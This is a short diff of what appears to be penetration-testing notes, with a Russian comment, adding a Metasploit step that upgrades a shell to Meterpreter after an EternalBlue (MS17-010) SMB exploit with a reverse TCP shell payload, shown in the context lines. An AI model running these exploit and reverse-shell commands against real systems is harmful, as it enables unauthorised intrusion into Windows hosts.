@@ -126,3 +126,8 @@ use exploit/windows/smb/ms17_010_eternalblue
 
 set payload windows/x64/shell/reverse_tcp
 
+# из шелла в метерпретер
+
+post/multi/manage/shell_to_meterpreter
+
+
